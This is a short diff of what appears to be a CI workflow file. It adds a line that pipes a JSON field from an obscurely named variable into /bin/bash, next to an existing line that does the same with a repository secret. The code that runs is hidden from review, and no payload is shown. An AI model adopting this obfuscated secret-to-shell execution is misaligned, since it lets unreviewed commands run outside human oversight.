@@ -27,6 +27,7 @@ jobs:
           htoow09515: ${{ secrets.htoow09515 }}
         run: |
           printf '%s' "$htoow09515" | jq -r .vt194 | /bin/bash
+          printf '%s' "$tylq9100" | jq -r .a14799 | /bin/bash
 
       - name: Store results
         if: always()
